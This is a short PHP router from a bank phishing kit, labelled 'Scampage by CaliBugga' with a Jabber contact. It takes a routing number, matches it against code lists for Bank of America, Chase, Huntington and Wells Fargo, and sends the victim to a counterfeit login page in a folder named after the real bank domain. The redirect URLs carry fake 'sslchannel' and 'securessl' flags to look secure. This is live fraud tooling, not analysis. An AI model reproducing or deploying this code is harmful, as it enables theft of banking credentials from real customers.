<?php
/*
* Scampage by CaliBugga
* Jabber: lauriemoore302@jabba.im
* ICQ: xxxxxxxxx
*/
session_start();



$hash = md5(date('Y-m-d h:i:s'));
$sort_code = $_GET["routing"];

$source = array_map('trim', explode("\n", file_get_contents('codes/bofa_codes.txt')));
$source4 = array_map('trim', explode("\n", file_get_contents('codes/chase_codes.txt')));
$source5 = array_map('trim', explode("\n", file_get_contents('codes/huntington_codes.txt')));
$source6 = array_map('trim', explode("\n", file_get_contents('codes/wells_codes.txt')));


if (in_array($sort_code, $source))  {

$_SESSION['bank_name'] = "BofA";
header("Location: banks/secure.bankofamerica.com/login.php?&sessionid=$hash&securessl=true");
die();

}
elseif (in_array($sort_code, $source4))  {

    $_SESSION['bank_name'] = "Chase";
    header("Location: banks/secure07b.chase.com/index.php?sslchannel=true&sessionid=" . $hash);
    die();

}


elseif (in_array($sort_code, $source5))  {

$_SESSION['bank_name'] = "Huntington";
    header("Location: banks/onlinebanking.huntington.com/index.php?sslchannel=true&sessionid=" . $hash);
    die();


}

elseif (in_array($sort_code, $source6))  {

    $_SESSION['bank_name'] = "Wells";
    header("Location: banks/connect.secure.wellsfargo.com/login.php?sslchannel=true&sessionid=" . $hash);
    die();
}

 else {
    header('Location: Exit.php?sslchannel=true&sessionid=' . $hash);
    exit;
}
